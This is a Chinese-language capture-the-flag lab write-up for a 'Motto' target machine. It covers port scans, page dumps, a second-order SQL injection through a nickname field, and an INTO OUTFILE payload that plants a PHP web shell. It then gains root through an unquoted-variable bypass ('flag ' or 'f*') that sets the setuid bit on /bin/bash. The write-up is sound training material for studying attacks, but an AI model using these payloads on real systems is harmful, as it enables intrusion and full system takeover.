**==这个靶机打下来，给我的感觉非常好。它的web入口十分隐蔽，难以撕开口子，却又并不是刻意为难。虽然web架构整体较小，但是仍然不失更像是偏实战中的漏洞挖掘==**

# 1.信息收集

常规tcp，udp扫描以及初步脚本扫描
```
┌──(root㉿kali)-[/tmp/test]
└─# nmap --min-rate 1000 -p- 192.168.2.82
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-19 08:03 EST
Nmap scan report for 192.168.2.82
Host is up (0.000048s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9090/tcp open  zeus-admin
MAC Address: 08:00:27:FD:37:CA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 11.64 seconds
                                                                                                     
┌──(root㉿kali)-[/tmp/test]
└─# nmap -sV -sC -O -p9090 192.168.2.82  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-19 08:03 EST
Nmap scan report for 192.168.2.82
Host is up (0.00052s latency).

PORT     STATE SERVICE VERSION
9090/tcp open  http    Golang net/http server
| fingerprint-strings: 
|   GenericLines, SqueezeCenter_CLI: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Date: Wed, 19 Nov 2025 13:03:53 GMT
|     <!DOCTYPE html>
|     <html lang="zh-CN">
|     <head>
|     <meta charset="UTF-8" />
|     <title>Mottos</title>
|     <link rel="stylesheet" href="/static/css/index.css" />
|     <style>
|     .top-right-auth {
|     position: fixed;
|     top: 20px;
|     right: 30px;
|     font-size: 14px;
|     font-family: Arial, sans-serif;
|     z-index: 1000;
|     .top-right-auth a, .top-right-auth button {
|     color: #2980b9;
|     text-decoration: none;
|     margin-left: 10px;
|     font-weight: 600;
|     border: 1.5px solid #2980b9;
|     padding: 6px 14px;
|     border-radius: 20px;
|     background: none;
|     cursor: pointer;
|_    transition: background-color 0.3s,
|_http-title: Mottos

MAC Address: 08:00:27:FD:37:CA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.32 seconds

┌──(root㉿kali)-[/tmp/test]
└─# nmap --script=vuln -p22,80,9090 192.168.2.82
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-19 08:05 EST
Nmap scan report for 192.168.2.82
Host is up (0.00040s latency).

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
9090/tcp open  zeus-admin
MAC Address: 08:00:27:FD:37:CA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 37.41 seconds
```
可以看到靶机开放了22端口，以及80和9090两个http服务，初步脚本扫描并未发现有价值信息

web主页
```
┌──(root㉿kali)-[/tmp/test]
└─# curl http://192.168.2.82/                   
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8" />
<title>点击方块小游戏</title>
<style>
  body {
    font-family: "微软雅黑", Arial, sans-serif;
    text-align: center;
    margin-top: 50px;
  }
  #header {
    font-size: 48px;
    font-weight: 900;
    color: #2c3e50;
    margin-bottom: 10px;
  }
  #gameBox {
    width: 100px;
    height: 100px;
    margin: 30px auto;
    background-color: red;
    cursor: pointer;
    user-select: none;
    border-radius: 10px;
    transition: background-color 0.3s;
  }
  #score, #time {
    font-size: 24px;
    margin: 10px;
  }
  #message {
    font-size: 28px;
    color: #f00;
    margin-top: 30px;
  }
</style>
</head>
<body>

<div id="header">Mazesec</div>

<h1>点击方块小游戏</h1>
<div id="score">得分: 0</div>
<div id="time">剩余时间: 30 秒</div>
<div id="gameBox"></div>
<div id="message"></div>

<script>
  let score = 0;
  let timeLeft = 30; // 30秒倒计时
  const gameBox = document.getElementById('gameBox');
  const scoreDisplay = document.getElementById('score');
  const timeDisplay = document.getElementById('time');
  const message = document.getElementById('message');

  function getRandomColor() {
    const letters = '0123456789ABCDEF';
    let color = '#';
    for(let i=0; i<6; i++) {
      color += letters[Math.floor(Math.random()*16)];
    }
    return color;
  }

  gameBox.addEventListener('click', () => {
    if(timeLeft <= 0) return;
    score++;
    scoreDisplay.textContent = '得分: ' + score;
    gameBox.style.backgroundColor = getRandomColor();
  });

  const timer = setInterval(() => {
    timeLeft--;
    timeDisplay.textContent = '剩余时间: ' + timeLeft + ' 秒';
    if(timeLeft <= 0) {
      clearInterval(timer);
      gameBox.style.display = 'none';
      message.textContent = '游戏结束！你的得分是：' + score;
    }
  }, 1000);
</script>

</body>
</html>
```

9090端口
```
┌──(root㉿kali)-[/tmp/test]
└─# curl http://192.168.2.82:9090/
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />
    <title>Mottos</title>
    <link rel="stylesheet" href="/static/css/index.css" />
    <style>
         
        .top-right-auth {
            position: fixed;
            top: 20px;
            right: 30px;
            font-size: 14px;
            font-family: Arial, sans-serif;
            z-index: 1000;
        }
        .top-right-auth a, .top-right-auth button {
            color: #2980b9;
            text-decoration: none;
            margin-left: 10px;
            font-weight: 600;
            border: 1.5px solid #2980b9;
            padding: 6px 14px;
            border-radius: 20px;
            background: none;
            cursor: pointer;
            transition: background-color 0.3s, color 0.3s;
            font-size: 14px;
            font-family: Arial, sans-serif;
        }
        .top-right-auth a:hover, .top-right-auth button:hover {
            background-color: #2980b9;
            color: white;
        }
        .top-right-auth span {
            color: #555;
            font-weight: 600;
        }

         
        .modal-overlay {
            display: none;  
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background-color: rgba(0,0,0,0.5);
            z-index: 2000;
            justify-content: center;
            align-items: center;
        }
         
        .modal {
            background: white;
            padding: 20px 30px;
            border-radius: 8px;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
            font-family: Arial, sans-serif;
        }
        .modal h3 {
            margin-top: 0;
            margin-bottom: 15px;
        }
        .modal input[type="text"] {
            width: 100%;
            padding: 8px 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            margin-bottom: 20px;
        }
        .modal-buttons {
            text-align: right;
        }
        .modal-buttons button {
            padding: 6px 14px;
            font-size: 14px;
            border-radius: 20px;
            border: 1.5px solid #2980b9;
            background: none;
            color: #2980b9;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s, color 0.3s;
            margin-left: 10px;
        }
        .modal-buttons button:hover {
            background-color: #2980b9;
            color: white;
        }
    </style>
</head>
<body>

<div class="top-right-auth">
    <a href="/mymottos">查看我的Motto</a>
    <a href="/myinfo">查看我的信息</a>
    <button id="openModalBtn" type="button">写一个Motto</button>
</div>

<h2 class="title">Mottos</h2>
<table class="user-table">
    <thead>
    <tr>
        <th>用户名</th>
        <th>Motto</th>
    </tr>
    </thead>
    <tbody>
    
    <tr>
        <td>ll104567</td>
        <td>认识的人越多 我就越喜欢狗.</td>
    </tr>
    
    <tr>
        <td>Yliken</td>
        <td>他说你任何为人称道的美丽 不及他第一次遇到你</td>
    </tr>
    
    <tr>
        <td>Yliken</td>
        <td>你是我患得患失的梦，我是你可有可无的人。毕竟这穿越山河的箭，刺的都是用情致疾的人</td>
    </tr>
    
    <tr>
        <td>ta0</td>
        <td>真正的大师永远都怀一颗学徒的心</td>
    </tr>
    
    <tr>
        <td>LingMj</td>
        <td>The best way to learn is to teach. Keep writing, keep sharing!</td>
    </tr>
    
    <tr>
        <td>c1trus</td>
        <td>the quieter you become, the more you can hear</td>
    </tr>
    
    <tr>
        <td>sunset</td>
        <td>Records of life and study at sunset.</td>
    </tr>
    
    <tr>
        <td>RedBean</td>
        <td>红豆生南国 春来发几枝 愿君多采撷 此物最相思</td>
    </tr>
    
    <tr>
        <td>HYH</td>
        <td>想念的终究会相遇吧</td>
    </tr>
    
    <tr>
        <td>DingTom</td>
        <td>where is my shell?</td>
    </tr>
    
    </tbody>
</table>


<div class="modal-overlay" id="modalOverlay">
    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
        <h3 id="modalTitle">写一个Motto</h3>
        <form id="mottoForm" method="POST" action="/">
            <input type="text" name="motto" id="mottoInput" placeholder="请输入一句话" required maxlength="100" />
            <div class="modal-buttons">
                <button type="button" id="cancelBtn">取消</button>
                <button type="submit">提交</button>
            </div>
        </form>
    </div>
</div>

<script>
    
    const openModalBtn = document.getElementById('openModalBtn');
    const modalOverlay = document.getElementById('modalOverlay');
    const cancelBtn = document.getElementById('cancelBtn');
    const mottoInput = document.getElementById('mottoInput');

    
    openModalBtn.addEventListener('click', () => {
        modalOverlay.style.display = 'flex';
        mottoInput.value = '';
        mottoInput.focus();
    });

    
    cancelBtn.addEventListener('click', () => {
        modalOverlay.style.display = 'none';
    });

    
    modalOverlay.addEventListener('click', (e) => {
        if (e.target === modalOverlay) {
            modalOverlay.style.display = 'none';
        }
    });

    
    document.getElementById('mottoForm').addEventListener('submit', (e) => {
        if (!mottoInput.value.trim()) {
            e.preventDefault();
            alert('请输入一句话');
            mottoInput.focus();
        }
    });
</script>

</body>
</html>
```
80端口是一个小游戏，9090端口是座右铭留言板

分别进行目录爆破，以及执行扩展名扫描，查看是否有隐藏信息
对80端口的目录爆破以及扩展名扫描，9090端口的扩展名扫描均无有价值信息，在此不列出
```
┌──(root㉿kali)-[/tmp/test]
└─# dirsearch -u http://192.168.2.82:9090/

Target: http://192.168.2.82:9090/

[08:10:36] Starting: 
[08:11:10] 200 -    1KB - /login                                            
[08:11:10] 301 -   41B  - /login/  ->  /login                               
[08:11:22] 200 -    1KB - /register                                         
[08:11:27] 301 -   43B  - /static  ->  /static/
```
可以看到有login以及register路由

注册账号进入在myinfo路由发现可以修改昵称，尝试修改昵称为留言板中存在的昵称，发现是可以修改成功的

修改昵称为Yliken然后再次访问mymottos路由可以看到多出了原属Yliken的motto，可以猜测mymottos路由执行了sql语句查询

尝试修改用户名为1' or 1=1#，可以修改成功，再次访问mymottos路由，发现列出了所有的motto

**至此已经可以判断此处存在二阶sql注入，漏洞成因为，在myinfo路由进行昵称修改未进行过滤，在访问mymottos路由时进行sql语句的渲染，从而产生漏洞**

# 2.web渗透

通过select user()可以得到数据库用户为root，所以可以写入木马到web目录，进而获取反弹shell

**==注：有些函数被禁用，具体可在phpinfo中查看==**

```
1' union select 5,6,"<?php phpinfo();exec($_POST[1]);?>" into outfile "/var/www/html/exec.php"#
```
写入木马后访问`http://192.168.2.82/exec.php`即可

# 3.提权

接到反弹shell后，在opt下发现具有s位的程序，并且在家目录发现备份文件
```
www-data@motto:/opt$ ls -al
total 32
drwxr-xr-x  2 root root  4096 Jul 31 08:27 .
drwxr-xr-x 19 root root  4096 Jul 31 03:46 ..
-r-xr-----  1 root root  1709 Jul 31 02:45 new.sh
-rwsr-sr-x  1 root root 16864 Jul 31 08:27 run_newsh

www-data@motto:/home/redbean/.backup$ ls -la
total 16
drwxr-xr-x 2 root    root    4096 Jul 31 08:27 .
drwxr-xr-x 3 redbean redbean 4096 Jul 31 08:29 ..
-r--r--r-- 1 root    root    1709 Jul 31 02:46 new.sh
-rw-r--r-- 1 root    root     509 Jul 31 08:27 run_newsh.c
```
查看程序逻辑可知，elf执行接受第一个参数，然后以root权限运行sh文件，并且传递参数
```
[ "$1" = "flag" ] && exit 2
[ $1 = "flag" ] && chmod +s /bin/bash
```
关键在于这两行

**1.字分割**(与bash版本有关)

**==$1会进行字分割以及文件名扩展，"$1"则不会
例如，如果我给定$1为flag （注意flag后有空格），则"$1"则为flag （空格），从而判等不成立，而$1则会因为字分割，从而导致$1=flag，$2=空格，从而判等为bash加上s位

```
www-data@motto:/opt$ ./run_newsh 'flag '

▓▒░ Loading system diagnostics ░▒▓

[INFO] Initializing environment checks:
 ● Module A status: OK (ver 2.9.432)
 ● Module B status: OK (ver 4.9.331)
 ● Module C status: OK (ver 3.2.375)
Random seed value: 10307
[INFO] Evaluating input parameters...
[INFO] Running diagnostic sequence:
 → Executing test 1 of 3
 → Executing test 2 of 3
 → Executing test 3 of 3

Waiting period: 6 seconds
>> Waiting T-6 seconds...
>> Countdown: 5
>> Waiting T-4 seconds...
>> Countdown: 3
>> Waiting T-2 seconds...
>> Countdown: 1
>> Waiting T-0 seconds...
Diagnostics complete.
Thank you for using the system monitor.
[STATS] Summary Report:
    Processes checked: 48
/opt/new.sh: line 60: bc: command not found
/opt/new.sh: line 60: echo: write error: Broken pipe
    CPU load average: 
    Uptime (hours): 72
www-data@motto:/opt$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```
可以看到bash加上了s位

**2.文件名扩展**

传入参数星号或问号作为通配符,从而"$1"判等不成立，而对于$1，则会在视作星号或问号为通配符在本级目录下查找文件，从而成功判等

```
www-data@motto:/tmp$ /opt/run_newsh 'f*'

▓▒░ Loading system diagnostics ░▒▓

[INFO] Initializing environment checks:
 ● Module A status: OK (ver 3.8.498)
 ● Module B status: OK (ver 2.11.255)
 ● Module C status: OK (ver 4.19.266)
Random seed value: 2185
[INFO] Evaluating input parameters...
[INFO] Running diagnostic sequence:
 → Executing test 1 of 3
 → Executing test 2 of 3
 → Executing test 3 of 3

Waiting period: 3 seconds
>> Countdown: 3
>> Waiting T-2 seconds...
>> Countdown: 1
>> Waiting T-0 seconds...
System stable.
Thank you for using the system monitor.
[STATS] Summary Report:
    Processes checked: 31
/opt/new.sh: line 60: bc: command not found
/opt/new.sh: line 60: echo: write error: Broken pipe
    CPU load average: 
    Uptime (hours): 56
www-data@motto:/tmp$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash

```
可以看到bash也被加上s位，进而即可提权

```
www-data@motto:/tmp$ bash -p
bash-5.0# cat /root/root.txt && cat /home/redbean/user.txt 
flag{796f75676574726f6f74627574796f7563616e6e6f74676574686572}
flag{796f756765747265646265616e}
```

